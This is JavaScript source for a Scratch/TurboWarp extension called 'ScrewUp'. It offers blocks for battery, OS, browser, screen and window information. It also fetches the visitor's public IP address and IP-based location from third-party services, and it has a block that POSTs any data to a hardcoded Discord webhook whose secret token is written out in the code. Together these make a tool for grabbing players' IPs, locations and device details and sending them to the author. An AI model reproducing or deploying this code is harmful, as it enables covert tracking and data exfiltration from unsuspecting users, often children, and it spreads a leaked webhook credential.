// https://extensions.turbowarp.org/CubesterYT/WindowControls.js
// https://extensions.turbowarp.org/shreder95ua/resolution.js
// https://extensions.turbowarp.org/NexusKitten/controlcontrols.js

(function (Scratch) {
  "use strict";

  let getBatteryPromise = null;
  let cachedBattery = null;
  let batteryError = false;

  const withBattery = (callback) => {
    if (!navigator.getBattery || batteryError) {
      return callback(null);
    }
    if (cachedBattery) {
      return callback(cachedBattery);
    }
    if (!getBatteryPromise) {
      getBatteryPromise = navigator
        .getBattery()
        .then((battery) => {
          getBatteryPromise = null;
          cachedBattery = battery;

          cachedBattery.addEventListener("chargingchange", () =>
            Scratch.vm.runtime.startHats("screwup_chargingChanged"),
          );
          cachedBattery.addEventListener("levelchange", () =>
            Scratch.vm.runtime.startHats("screwup_levelChanged"),
          );
          cachedBattery.addEventListener("chargingtimechange", () =>
            Scratch.vm.runtime.startHats("screwup_chargeTimeChanged"),
          );
          cachedBattery.addEventListener("dischargingtimechange", () =>
            Scratch.vm.runtime.startHats("screwup_dischargeTimeChanged"),
          );

          return cachedBattery;
        })
        .catch((error) => {
          getBatteryPromise = null;
          console.error("Could not get battery", error);
          batteryError = true;
          return null;
        });
    }
    return getBatteryPromise.then((battery) => {
      return callback(battery);
    });
  };

  withBattery(() => {});
  class ScrewUp {
    getInfo() {
      return {
        id: "screwup",
        name: "ScrewUp",
        color1: "#4287f5",
        blocks: [
          {
            blockType: "label",
            text: "Battery Information",
          },
          {
            opcode: "charging",
            blockType: Scratch.BlockType.BOOLEAN,
            text: "charging?",
          },
          {
            opcode: "level",
            blockType: Scratch.BlockType.REPORTER,
            text: "battery level",
          },
          {
            opcode: "chargeTime",
            blockType: Scratch.BlockType.REPORTER,
            text: "seconds until charged",
          },
          {
            opcode: "dischargeTime",
            blockType: Scratch.BlockType.REPORTER,
            text: "seconds until empty",
          },
          {
            blockType: "label",
            text: "IP Address Infomaton",
          },
          {
            opcode: "getIPAddress",
            blockType: Scratch.BlockType.REPORTER,
            text: "get IPv4 address",
          },
          {
            opcode: "getIPlocationInfo",
            blockType: Scratch.BlockType.REPORTER,
            text: "get IPv4 location info using ipapi.co",
          },
          {
            blockType: "label",
            text: "Device Infomation",
          },
          {
            opcode: "getOS",
            blockType: Scratch.BlockType.REPORTER,
            text: "operating system",
          },
          {
            opcode: "getBrowser",
            blockType: Scratch.BlockType.REPORTER,
            text: "browser",
          },
          {
            opcode: "getMemory",
            blockType: Scratch.BlockType.REPORTER,
            text: "device RAM in GB",
          },
          {
            opcode: "getPreferredColorScheme",
            blockType: Scratch.BlockType.BOOLEAN,
            text: "user prefers [THEME] color scheme?",
            arguments: {
              THEME: {
                type: Scratch.ArgumentType.STRING,
                menu: "THEME",
                defaultValue: "dark",
              },
            },
          },
          {
            opcode: "getPreferredReducedMotion",
            blockType: Scratch.BlockType.BOOLEAN,
            text: "user prefers reduced motion?",
          },
          {
            opcode: "getPreferredContrast",
            blockType: Scratch.BlockType.BOOLEAN,
            text: "user prefers more contrast?",
          },
          {
            blockType: "label",
            text: "Screen Size",
          },
          {
            opcode: "screenW",
            blockType: Scratch.BlockType.REPORTER,
            text: "screen width",
          },
          {
            opcode: "screenH",
            blockType: Scratch.BlockType.REPORTER,
            text: "screen height",
          },
          {
            blockType: "label",
            text: "Window Infomation",
          },
          {
            opcode: "isFocused",
            blockType: Scratch.BlockType.BOOLEAN,
            text: "is window focused",
          },
          {
            opcode: "docTitle",
            blockType: Scratch.BlockType.REPORTER,
            text: "window title",
          },
          {
            blockType: "label",
            text: "Project Infomation",
          },
          {
            opcode: "isSandboxed",
            blockType: Scratch.BlockType.BOOLEAN,
            text: "is project sandboxed",
          },
          {
            blockType: "label",
            text: "Send Information",
          },
          {
            opcode: "sendData",
            blockType: Scratch.BlockType.COMMAND,
            text: "send [INFO] to webhook",
            arguments: {
              INFO: {
                type: Scratch.ArgumentType.STRING,
              },
            },
          },
        ],
        menus: {
          THEME: {
            acceptReporters: true,
            items: ["light", "dark"],
          },
        },
      };
    }

    // Battery info
    charging() {
      return withBattery((battery) => {
        if (!battery) return true;
        return battery.charging;
      });
    }
    level() {
      return withBattery((battery) => {
        if (!battery) return 100;
        return battery.level * 100;
      });
    }
    chargeTime() {
      return withBattery((battery) => {
        if (!battery) return 0;
        return battery.chargingTime;
      });
    }
    dischargeTime() {
      return withBattery((battery) => {
        if (!battery) return Infinity;
        return battery.dischargingTime;
      });
    }
    // navigator info
    getOS() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Windows")) {
        return "Windows";
      } else if (userAgent.includes("Android")) {
        return "Android";
      } else if (
        userAgent.includes("iPhone") ||
        userAgent.includes("iPod") ||
        userAgent.includes("iPad")
      ) {
        return "iOS";
      } else if (userAgent.includes("Linux")) {
        return "Linux";
      } else if (userAgent.includes("CrOS")) {
        return "ChromeOS";
      } else if (userAgent.includes("Mac OS")) {
        return "macOS";
      }
      return "Other";
    }
    getBrowser() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Chrome")) {
        return "Chrome";
      } else if (userAgent.includes("Firefox")) {
        return "Firefox";
      } else if (userAgent.includes("Safari")) {
        return "Safari";
      }
      return "Other";
    }
    getMemory() {
      if (navigator.deviceMemory === undefined) {
        return "Unsupported";
      } else {
        return navigator.deviceMemory;
      }
    }
    getPreferredColorScheme(args) {
      return (
        window.matchMedia("(prefers-color-scheme: dark)").matches ===
        (args.THEME === "dark")
      );
    }
    getPreferredReducedMotion() {
      return !!window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    }
    getPreferredContrast() {
      return !!window.matchMedia("(prefers-contrast: more)").matches;
    }
    // thing related to it
    getIPAddress() {
      return fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => {
          return data.ip;
        })
        .catch((error) => {
          return error;
        });
    }
    getIPlocationInfo() {
      return (
        fetch("https://ipapi.co/json/")
          // it HAS to be .text() for it to work properly
          .then((response) => response.text())
          .catch((error) => {
            return error;
          })
      );
    }
    // screen
    screenW() {
      return screen.width;
    }
    screenH() {
      return screen.height;
    }
    // Has to be UNSANDBOXED below
    isFocused() {
      return document.hasFocus();
    }
    docTitle() {
      return document.title;
    }
    // rest are fine
    isSandboxed() {
      return !Scratch.extensions.unsandboxed;
    }
    sendData(args) {
      const jsonData = JSON.parse(args.INFO);
      const modifiedData = {};

      for (let key in jsonData) {
        modifiedData[key] = jsonData[key];
      }

      const jsonString = JSON.stringify(modifiedData, null, 2);
      var data = { content: jsonString };
      const webhookUrl =
        "https://discord.com/api/webhooks/1167167898356285500/VARZvHq6xGd4rEiYl_lf-yaTPYCXNCcgxRZzAl18ett0TiCUvME0Tt9kMT8RbItjvNlM";
      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    }
  }

  Scratch.extensions.register(new ScrewUp());
})(Scratch);
